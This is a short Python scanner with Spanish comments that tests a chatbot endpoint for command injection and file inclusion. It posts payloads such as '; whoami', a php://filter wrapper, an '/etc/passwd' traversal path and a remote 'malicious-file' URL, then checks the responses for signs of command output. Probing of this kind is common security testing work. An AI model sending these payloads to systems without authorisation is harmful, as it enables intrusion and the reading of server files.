import requests
import re

def test_code_injection_rfi(base_url, chat_endpoint):
    # Diferentes tipos de payloads para inyecci贸n de c贸digo y RFI
    payloads = [
        "; ls",
        "| ls",
        "; whoami",
        "| whoami",
        "|| whoami",
        "; phpinfo()",
        "php://filter/convert.base64-encode/resource=index.php",
        "../../../../etc/passwd",
        "http://example.com/malicious-file"
    ]
    
    vulnerable = False
    
    for payload in payloads:
        # Enviar el payload al endpoint del chatbot
        response = requests.post(base_url + chat_endpoint, data={'message': payload})
        content = response.content.decode('utf-8')
        
        # Buscar indicios de una inyecci贸n de c贸digo o RFI exitosa
        if re.search(r"(root|www-data|command not found|uid=|gid=|groups=)", content, re.IGNORECASE):
            print(f"Potentially vulnerable to Code Injection or RFI: {payload}")
            vulnerable = True
            
    if not vulnerable:
        print("No potential Code Injection or RFI vulnerabilities detected.")

# Ejemplo de uso
# base_url = "http://example.com"
# chat_endpoint = "/api/chat"
# test_code_injection_rfi(base_url, chat_endpoint)
